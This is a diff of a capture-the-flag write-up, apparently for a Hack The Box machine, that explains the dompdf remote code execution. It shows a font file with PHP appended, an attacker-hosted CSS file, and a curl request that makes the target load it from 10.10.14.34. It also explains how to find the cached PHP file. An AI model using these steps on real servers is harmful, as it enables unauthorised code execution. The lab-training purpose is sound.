@@ -122,10 +122,10 @@ What happening in this exploit is, if attacker take a valid `.ttf` font file, Ad
 
 Generate TTF file with PHP code.
 * TTF file from exploit POC -> https://github.com/positive-security/dompdf-rce/raw/main/exploit/exploit_font.php
-* Or we can use a valid font file from "[dompdf fonts](https://github.com/dompdf/dompdf/tree/master/lib/fonts)" and append PHP code in the end
+* Or we can use a valid font file from "[dompdf fonts](https://github.com/dompdf/dompdf/tree/master/lib/fonts)" and append PHP code in the end.
 
-Create `exploit.css` file which includes A that exploit font from http server.
-* Font file get cached on the server and removed after few minute. So, we need to change the "font-family" name to run it immediately.
+Create `exploit.css` file which includes that font from attacker's http server.
+* Font file get cached on the server and removed after few minute. So, we need to change the "font-family" name to execute different code again immediately.
 
 ```css
 @font-face {
@@ -136,19 +136,19 @@ Create `exploit.css` file which includes A that exploit font from http server.
   }
 ```
 
-Host these files in a HTTP server
+Host these files on a HTTP server
 ```bash
 python -m http.server 8000
 ```
 
 Send payload in `/api/html2pdf` POST request
 ```bash
-curl -isX POST http://prd.m.rendering-api.interface.htb/api/html2pdf -d '{"html": "<link rel=stylesheet href='http://10.10.14.34:8000/exploit.css'>"}' -H "Content-Type: application/json"
+curl -isX POST http://prd.m.rendering-api.interface.htb/api/html2pdf -d $'{"html": "<link rel=stylesheet href=\'http://10.10.14.34:8000/exploit.css\'>"}' -H "Content-Type: application/json"
 ```
 
-Access the cached file -
+Access cached file -
 
-* The filename of the cached font file is deterministic and can be derived easily. It comprises of the font family, font style and md5 hash of the remote URL.
+* Filename of the cached font file is deterministic and can be derived easily. It comprises of the font family, font style and md5 hash of the remote URL.
   * Filename -> `<font_family>+_+<font-style>+_+<md5_hash>+.+<file_extension>`
     * `md5_hash` is determined by the full url for the font file `http://[HOST]:[PORT]/<FILENAME>` -> `echo -n http://[HOST]:[PORT]/<FILENAME> | md5sum`
     * `font_family` name must be in all lowercase.
